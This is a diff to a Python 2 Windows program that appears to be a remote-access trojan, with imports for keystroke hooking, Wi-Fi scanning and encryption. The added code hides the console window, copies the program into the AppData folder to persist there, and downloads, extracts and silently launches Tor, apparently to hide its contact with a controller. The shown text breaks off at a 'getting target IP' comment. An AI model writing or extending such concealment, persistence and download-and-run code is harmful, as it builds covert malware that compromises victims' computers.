@@ -1,9 +1,16 @@
-import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson, thread
-import inspect, urllib2, os.path, base64, getpass, urllib, time, pyHook, pythoncom, time
+import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson, thread, zipfile
+import inspect, urllib2, os.path, base64, getpass, urllib, time, pyHook, pythoncom, time, subprocess
+import win32console, win32gui
 from subprocess import Popen, PIPE, STDOUT
 from Crypto.Cipher import AES
 from WindowsWifi import getWirelessInterfaces, getWirelessAvailableNetworkList
 from _winreg import *
+
+def hide():
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
+    return True
+hide()
 
 class PKCS7Encoder():
     class InvalidBlockSizeError(Exception):
@@ -74,6 +81,45 @@ def DownHTTP(url,fileName):
         fileHTTP.retrieve(url,url.split("/")[len(url.split("/"))-1])
     else:
         fileHTTP.retrieve(url,fileName)
+
+###### setup  EDIT
+def setup():
+    oldpath = os.getcwd()
+    newpath = os.getenv("appdata")
+    if os.path.exists(newpath):
+        os.chdir(newpath)
+        if not os.path.exists("EditMe"):
+            os.makedirs("EditMe")
+            os.chdir("EditMe")
+            from shutil import copyfile
+            copyfile(oldpath+r'\EditMe.exe', "EditMe.exe") #Edit me
+            copyfile(oldpath+r"\msvcr100.dll", "msvcr100.dll")
+    else:
+            os.chdir("EditMe")
+            from shutil import copyfile
+            copyfile(oldpath+"'\'EditMe", "EditMe.exe") #Edit me
+            copyfile(oldpath+"'\'msvcr100.dll", "msvcr100.dll")
+
+print os.getcwd()
+def DownTor():
+    if not os.path.exists("Tor"):
+        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
+        response = opener.open('https://www.torproject.org/dist/torbrowser/6.0.4/tor-win32-0.2.8.6.zip')
+        f = open("tor.zip", "wb")
+        f.write(response.read())
+        f.close()
+        time.sleep(0.1)
+        with zipfile.ZipFile('tor.zip', "r") as z:
+            z.extractall(os.getenv("appdata")+r"\EditMe")
+        T1 = subprocess.Popen([os.getenv("appdata")+r"\EditMe\Tor\tor.exe"]).pid
+        return " T1"
+    else:
+        T2 = subprocess.Popen([os.getenv("appdata")+r"\Eduroam\Tor\tor.exe"]).pid
+        return " T2"
+
+######## on 1st run
+setup()
+staTor = DownTor()
 
 # getting target IP
 try:
